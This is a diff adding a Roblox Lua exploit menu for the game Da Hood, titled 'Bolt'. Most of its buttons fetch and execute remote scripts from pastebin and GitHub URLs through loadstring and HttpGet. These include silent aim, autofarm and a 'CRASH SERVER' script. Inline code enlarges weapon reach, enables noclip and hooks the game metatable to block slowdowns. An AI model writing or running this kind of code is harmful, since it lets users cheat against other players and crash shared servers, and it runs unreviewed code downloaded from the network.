@@ -1,0 +1,332 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Tag = Instance.new("TextLabel")
+local Fly = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local Rob = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local Fps = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local Admin = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local Aim = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local Ani = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local Reach = Instance.new("TextButton")
+local UICorner_7 = Instance.new("UICorner")
+local Armour = Instance.new("TextButton")
+local UICorner_8 = Instance.new("UICorner")
+local Slow = Instance.new("TextButton")
+local UICorner_9 = Instance.new("UICorner")
+local disco = Instance.new("TextLabel")
+local Crash = Instance.new("TextButton")
+local UICorner_10 = Instance.new("UICorner")
+local Noclip = Instance.new("TextButton")
+local UICorner_11 = Instance.new("UICorner")
+local God = Instance.new("TextButton")
+local UICorner_12 = Instance.new("UICorner")
+local Fov = Instance.new("TextButton")
+local UICorner_13 = Instance.new("UICorner")
+local Creds = Instance.new("TextLabel")
+local UICorner_14 = Instance.new("UICorner")
+local Creds_2 = Instance.new("TextLabel")
+local UICorner_15 = Instance.new("UICorner")
+
+--Properties:
+
+ScreenGui.Parent = game:GetService('CoreGui')
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(67, 97, 124)
+Frame.BorderColor3 = Color3.fromRGB(13, 3, 53)
+Frame.Position = UDim2.new(0.215743437, 0, 0.223312885, 0)
+Frame.Size = UDim2.new(0, 612, 0, 357)
+Frame.Draggable = true
+Frame.Active = true
+Frame.Selectable = true
+
+Tag.Name = "Tag"
+Tag.Parent = Frame
+Tag.BackgroundColor3 = Color3.fromRGB(67, 97, 124)
+Tag.BorderSizePixel = 0
+Tag.Size = UDim2.new(0, 179, 0, 50)
+Tag.Font = Enum.Font.SourceSansLight
+Tag.Text = "Bolt - Da Hood"
+Tag.TextColor3 = Color3.fromRGB(247, 255, 253)
+Tag.TextSize = 30.000
+Tag.TextWrapped = true
+
+Fly.Name = "Fly"
+Fly.Parent = Frame
+Fly.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Fly.Position = UDim2.new(0.0263620354, 0, 0.172910661, 0)
+Fly.Size = UDim2.new(0, 164, 0, 40)
+Fly.Font = Enum.Font.SourceSans
+Fly.Text = "Fly (X)"
+Fly.TextColor3 = Color3.fromRGB(0, 0, 0)
+Fly.TextSize = 30.000
+Fly.TextWrapped = true
+Fly.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/xR6U0GH2'),true))()
+end)
+
+UICorner.Parent = Fly
+
+Rob.Name = "Rob"
+Rob.Parent = Frame
+Rob.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Rob.Position = UDim2.new(0.360281199, 0, 0.172910661, 0)
+Rob.Size = UDim2.new(0, 158, 0, 40)
+Rob.Font = Enum.Font.SourceSans
+Rob.Text = "AutoFarm"
+Rob.TextColor3 = Color3.fromRGB(0, 0, 0)
+Rob.TextScaled = true
+Rob.TextSize = 14.000
+Rob.TextWrapped = true
+Rob.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/SK08iJs0'),true))()
+end)
+
+UICorner_2.Parent = Rob
+
+Fps.Name = "Fps"
+Fps.Parent = Frame
+Fps.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Fps.Position = UDim2.new(0.685413003, 0, 0.172910661, 0)
+Fps.Size = UDim2.new(0, 164, 0, 40)
+Fps.Font = Enum.Font.SourceSans
+Fps.Text = "Fps Unlocker"
+Fps.TextColor3 = Color3.fromRGB(0, 0, 0)
+Fps.TextSize = 30.000
+Fps.TextWrapped = true
+Fps.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/mfMH1Yks'),true))()
+end)
+
+UICorner_3.Parent = Fps
+
+Admin.Name = "Admin"
+Admin.Parent = Frame
+Admin.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Admin.Position = UDim2.new(0.685413003, 0, 0.354466856, 0)
+Admin.Size = UDim2.new(0, 164, 0, 40)
+Admin.Font = Enum.Font.SourceSans
+Admin.Text = "Admin Fly"
+Admin.TextColor3 = Color3.fromRGB(0, 0, 0)
+Admin.TextSize = 36.000
+Admin.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/swag/main/admin_fly"))()
+end)
+
+UICorner_4.Parent = Admin
+
+Aim.Name = "Aim"
+Aim.Parent = Frame
+Aim.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Aim.Position = UDim2.new(0.360281199, 0, 0.354466856, 0)
+Aim.Size = UDim2.new(0, 158, 0, 40)
+Aim.Font = Enum.Font.SourceSans
+Aim.Text = "Silent Aim (E)"
+Aim.TextColor3 = Color3.fromRGB(0, 0, 0)
+Aim.TextSize = 32.000
+Aim.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Stefanuk12/ROBLOX/master/Games/Da%20Hood/SilentAimAimLock.lua"))()
+end)
+
+UICorner_5.Parent = Aim
+
+Ani.Name = "Ani"
+Ani.Parent = Frame
+Ani.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Ani.Position = UDim2.new(0.026362041, 0, 0.354466856, 0)
+Ani.Size = UDim2.new(0, 164, 0, 40)
+Ani.Font = Enum.Font.SourceSans
+Ani.Text = "Animation Changer"
+Ani.TextColor3 = Color3.fromRGB(0, 0, 0)
+Ani.TextSize = 24.000
+Ani.TextWrapped = true
+Ani.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/V6ykTV4g'),true))()
+end)
+
+UICorner_6.Parent = Ani
+
+Reach.Name = "Reach"
+Reach.Parent = Frame
+Reach.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Reach.Position = UDim2.new(0.0263620391, 0, 0.515850127, 0)
+Reach.Size = UDim2.new(0, 164, 0, 40)
+Reach.Font = Enum.Font.SourceSans
+Reach.Text = "Reach (Reset To Stop)"
+Reach.TextColor3 = Color3.fromRGB(0, 0, 0)
+Reach.TextScaled = true
+Reach.TextSize = 14.000
+Reach.TextWrapped = true
+Reach.MouseButton1Down:connect(function()
+	game.Players.LocalPlayer.Backpack["[Knife]"].Handle.Size = Vector3.new(100, 100, 100)
+	game.Players.LocalPlayer.Backpack["[Pitchfork]"].Handle.Size = Vector3.new(100, 100, 100)
+	game.Players.LocalPlayer.Backpack["[Bat]"].Handle.Size = Vector3.new(100, 100, 100)
+	game.Players.LocalPlayer.Backpack["[Shovel]"].Handle.Size = Vector3.new(100, 100, 100)
+end)
+
+UICorner_7.Parent = Reach
+
+Armour.Name = "Armour"
+Armour.Parent = Frame
+Armour.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Armour.Position = UDim2.new(0.360281199, 0, 0.515850127, 0)
+Armour.Size = UDim2.new(0, 158, 0, 40)
+Armour.Font = Enum.Font.SourceSans
+Armour.Text = "AutoBuy Armour (50%)"
+Armour.TextColor3 = Color3.fromRGB(0, 0, 0)
+Armour.TextScaled = true
+Armour.TextSize = 14.000
+Armour.TextWrapped = true
+Armour.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/lerkermer/sources/main/AutoBuyArmor'),true))()
+end)
+
+UICorner_8.Parent = Armour
+
+Slow.Name = "Slow"
+Slow.Parent = Frame
+Slow.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Slow.Position = UDim2.new(0.685413003, 0, 0.515850127, 0)
+Slow.Size = UDim2.new(0, 164, 0, 40)
+Slow.Font = Enum.Font.SourceSans
+Slow.Text = "Anti Slow"
+Slow.TextColor3 = Color3.fromRGB(0, 0, 0)
+Slow.TextSize = 37.000
+Slow.TextWrapped = true
+Slow.MouseButton1Down:connect(function()
+	local mt = getrawmetatable(game)
+	local backup
+	backup = hookfunction(mt.__newindex, newcclosure(function(self, key, value)
+	if key == "WalkSpeed" and value < 16 then
+	    value = 16
+	end
+		return backup(self, key, value)
+    end))
+end)
+
+UICorner_9.Parent = Slow
+
+disco.Name = "disco"
+disco.Parent = Frame
+disco.BackgroundColor3 = Color3.fromRGB(67, 97, 124)
+disco.BorderSizePixel = 0
+disco.Position = UDim2.new(0.325163394, 0, 0.0336134434, 0)
+disco.Size = UDim2.new(0, 230, 0, 26)
+disco.Font = Enum.Font.SourceSansLight
+disco.Text = "discord.gg/fMgjMfyK"
+disco.TextColor3 = Color3.fromRGB(0, 0, 0)
+disco.TextScaled = true
+disco.TextSize = 14.000
+disco.TextWrapped = true
+
+Crash.Name = "Crash"
+Crash.Parent = Frame
+Crash.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Crash.Position = UDim2.new(0.704248309, 0, 0.893557429, 0)
+Crash.Size = UDim2.new(0, 174, 0, 34)
+Crash.Font = Enum.Font.GothamBold
+Crash.Text = "CRASH SERVER"
+Crash.TextColor3 = Color3.fromRGB(255, 255, 255)
+Crash.TextScaled = true
+Crash.TextSize = 14.000
+Crash.TextWrapped = true
+Crash.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))() 
+end)
+
+UICorner_10.Parent = Crash
+
+Noclip.Name = "Noclip"
+Noclip.Parent = Frame
+Noclip.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Noclip.Position = UDim2.new(0.0252823085, 0, 0.689519584, 0)
+Noclip.Size = UDim2.new(0, 164, 0, 40)
+Noclip.Font = Enum.Font.SourceSans
+Noclip.Text = "NoClip (V)"
+Noclip.TextColor3 = Color3.fromRGB(0, 0, 0)
+Noclip.TextSize = 37.000
+Noclip.TextWrapped = true
+Noclip.MouseButton1Down:connect(function()
+    game:getService("RunService"):BindToRenderStep("",0,function()
+	    if not game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid") then return end
+	    if game:getService("UserInputService"):IsKeyDown(Enum.KeyCode.V) then
+	        game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid"):ChangeState(11)
+	    end
+	end)
+end)
+
+UICorner_11.Parent = Noclip
+
+God.Name = "God"
+God.Parent = Frame
+God.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+God.Position = UDim2.new(0.359477133, 0, 0.689519644, 0)
+God.Size = UDim2.new(0, 158, 0, 40)
+God.Font = Enum.Font.SourceSans
+God.Text = "Godmode"
+God.TextColor3 = Color3.fromRGB(0, 0, 0)
+God.TextScaled = true
+God.TextSize = 14.000
+God.TextWrapped = true
+God.MouseButton1Down:connect(function()
+end)
+
+UICorner_12.Parent = God
+
+Fov.Name = "Fov"
+Fov.Parent = Frame
+Fov.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Fov.Position = UDim2.new(0.689542532, 0, 0.689519644, 0)
+Fov.Size = UDim2.new(0, 158, 0, 40)
+Fov.Font = Enum.Font.SourceSans
+Fov.Text = "FOV (50%)"
+Fov.TextColor3 = Color3.fromRGB(0, 0, 0)
+Fov.TextScaled = true
+Fov.TextSize = 14.000
+Fov.TextWrapped = true
+Fov.MouseButton1Down:connect(function()
+	workspace.CurrentCamera.FieldOfView = 120
+end)
+
+UICorner_13.Parent = Fov
+
+Creds.Name = "Creds"
+Creds.Parent = Frame
+Creds.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Creds.BorderSizePixel = 0
+Creds.Position = UDim2.new(0.0163398683, 0, 0.935574234, 0)
+Creds.Size = UDim2.new(0, 189, 0, 19)
+Creds.Font = Enum.Font.SourceSans
+Creds.Text = "corrupt#5424/LaFlame#9114"
+Creds.TextColor3 = Color3.fromRGB(255, 255, 255)
+Creds.TextScaled = true
+Creds.TextSize = 14.000
+Creds.TextWrapped = true
+
+UICorner_14.Parent = Creds
+
+Creds_2.Name = "Creds"
+Creds_2.Parent = Frame
+Creds_2.BackgroundColor3 = Color3.fromRGB(13, 160, 168)
+Creds_2.BorderSizePixel = 0
+Creds_2.Position = UDim2.new(0.357843131, 0, 0.935574234, 0)
+Creds_2.Size = UDim2.new(0, 189, 0, 19)
+Creds_2.Font = Enum.Font.SourceSans
+Creds_2.Text = "Jacobb#9566"
+Creds_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Creds_2.TextScaled = true
+Creds_2.TextSize = 14.000
+Creds_2.TextWrapped = true
+
+	
